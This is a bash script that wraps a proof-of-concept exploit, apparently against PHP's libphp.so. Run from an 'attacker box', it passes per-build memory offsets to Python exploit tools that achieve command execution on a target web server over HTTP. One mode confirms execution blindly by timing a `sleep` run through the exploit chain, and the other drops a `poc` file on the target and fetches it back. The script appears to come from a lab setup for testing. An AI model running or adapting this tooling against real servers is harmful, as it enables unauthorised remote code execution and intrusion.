#!/usr/bin/env bash
# =============================================================================
# p2s_offtest.sh  --  run the PoC with offsets you extracted on the target.
#
# Pairs with p2s_target_vars.sh: that script (run ON the target) prints the
# per-build variables; this one (run from the ATTACKER box) takes them as CLI
# arguments and drives the tester over HTTP.
#
#   ./p2s_offtest.sh -u http://TARGET/ --zif 0x.. --dtor 0x.. --htdata 0x..
#
# Default mode is the BLIND verifier (p2s_verify.py): runs `sleep N` through the
# chain and times it -- writes nothing, drops nothing, just proves yes/no.
# Add --proof to instead run p2s.py, which drops a readable `poc` file and
# fetches it back over HTTP (an artifact, for a demo).
#
# Options:
#   -u URL          target (required)
#   --libphp FILE   a COPY of the target's libphp.so on THIS box: derive all
#                   three offsets straight from it (no --zif/--dtor/--htdata
#                   needed, nothing run on the target). This is the easy path.
#   --zif HEX       ZIF_OFFSET   from p2s_target_vars.sh
#   --dtor HEX      DTOR_OFFSET  from p2s_target_vars.sh
#   --htdata HEX    HTDATA_OFFSET from p2s_target_vars.sh  (default 0x690D8)
#   --sleep N       blind-mode sleep signal (default 8)
#   --sweep K       htdata +-K page sweep (default 2)
#   --env FILE      source ZIF/DTOR/HTDATA from a vars.env instead of flags
#   --proof         file-drop proof (p2s.py) instead of blind timing
#   -- ...          pass any remaining args straight to the Python tool
# =============================================================================
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
LAB="$(cd "$HERE/.." && pwd)"

URL=""; ZIF=""; DTOR=""; HTD="0x690D8"; SLEEP=8; SWEEP=2; PROOF=0; ENVF=""; LIBPHP=""; EXTRA=()
while [ $# -gt 0 ]; do
  case "$1" in
    -u|--url)   URL="${2:-}"; shift 2;;
    --libphp)   LIBPHP="${2:-}"; shift 2;;
    --zif)      ZIF="${2:-}"; shift 2;;
    --dtor)     DTOR="${2:-}"; shift 2;;
    --htdata)   HTD="${2:-}"; shift 2;;
    --sleep)    SLEEP="${2:-}"; shift 2;;
    --sweep)    SWEEP="${2:-}"; shift 2;;
    --env)      ENVF="${2:-}"; shift 2;;
    --proof)    PROOF=1; shift;;
    --)         shift; EXTRA=("$@"); break;;
    -h|--help)  sed -n '2,32p' "$0"; exit 0;;
    *)          echo "unknown flag: $1" >&2; exit 2;;
  esac
done

# --libphp: run everything off a local copy of the target's module.
if [ -n "$LIBPHP" ]; then
  [ -f "$LIBPHP" ] || { echo "[-] no such file: $LIBPHP" >&2; exit 2; }
  echo "[*] deriving offsets from $LIBPHP ..."
  VARS="$("$HERE/p2s_target_vars.sh" "$LIBPHP" --env 2>/dev/null)" || { echo "[-] extraction failed (stripped? install dbgsym)"; exit 3; }
  eval "$VARS"
  ZIF="${ZIF:-$ZIF_OFFSET}"; DTOR="${DTOR:-$DTOR_OFFSET}"; HTD="$HTDATA_OFFSET"
  echo "[*] libphp -> php ${PHP_VERSION:-?}  zif=$ZIF dtor=$DTOR htdata=$HTD"
fi

if [ -n "$ENVF" ]; then
  # shellcheck disable=SC1090
  . "$ENVF"
  ZIF="${ZIF:-${ZIF_OFFSET:-}}"; DTOR="${DTOR:-${DTOR_OFFSET:-}}"; HTD="${HTDATA_OFFSET:-$HTD}"
fi

[ -n "$URL" ]  || { echo "need -u URL" >&2; exit 2; }
[ -n "$ZIF" ]  || { echo "need --zif HEX (from p2s_target_vars.sh)" >&2; exit 2; }
[ -n "$DTOR" ] || { echo "need --dtor HEX (from p2s_target_vars.sh)" >&2; exit 2; }

echo "[*] target   : $URL"
echo "[*] zif=$ZIF dtor=$DTOR htdata=$HTD"

if [ "$PROOF" = 1 ]; then
  echo "[*] mode     : file-drop proof (p2s.py)"
  exec python3 "$LAB/p2s.py" -u "$URL" \
    --zif "$ZIF" --dtor "$DTOR" --htdata "$HTD" --sweep "$SWEEP" "${EXTRA[@]}"
else
  echo "[*] mode     : blind timing verifier (p2s_verify.py) -- no artifacts"
  exec python3 "$LAB/exploit/p2s_verify.py" -u "$URL" \
    --zif-offset "$ZIF" --dtor-offset "$DTOR" --htdata-offset "$HTD" \
    --sleep "$SLEEP" --sweep "$SWEEP" "${EXTRA[@]}"
fi
